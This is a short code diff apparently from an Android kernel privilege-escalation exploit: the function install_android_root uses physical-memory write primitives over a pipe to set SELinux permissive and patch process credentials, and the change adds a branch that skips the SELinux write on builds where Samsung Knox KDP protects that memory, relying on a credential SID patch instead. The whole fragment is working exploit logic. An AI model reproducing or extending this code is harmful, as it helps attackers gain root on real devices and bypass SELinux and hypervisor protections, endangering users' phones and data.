@@ -429,9 +429,17 @@ int install_android_root(int fd) {
           (unsigned long long)real_caps_before[CRED_CAP_EFFECTIVE],
           (unsigned long long)real_caps_after[CRED_CAP_EFFECTIVE]);
 
+#if SELINUX_ENFORCING_KDP_RO
+  /* selinux_enforcing lives in .kdp_ro; the Knox hypervisor owns that page
+   * and an EL1 write faults.  The cred SID patch below is the effective
+   * privilege change on this build. */
+  int selinux_direct_ok = 0;
+  pr_warning("root selinux enforcing is KDP-protected; skipping write\n");
+#else
   uint8_t permissive = 0;
   int selinux_direct_ok =
     pipe_phys_write_data(fd, selinux_addr, &permissive, sizeof(permissive));
+#endif
   uint8_t selinux_mid = 0xff;
   pipe_phys_read_data(fd, selinux_addr, &selinux_mid, sizeof(selinux_mid));
   pr_info("root selinux direct write ok=%d %u->%u\n", selinux_direct_ok,
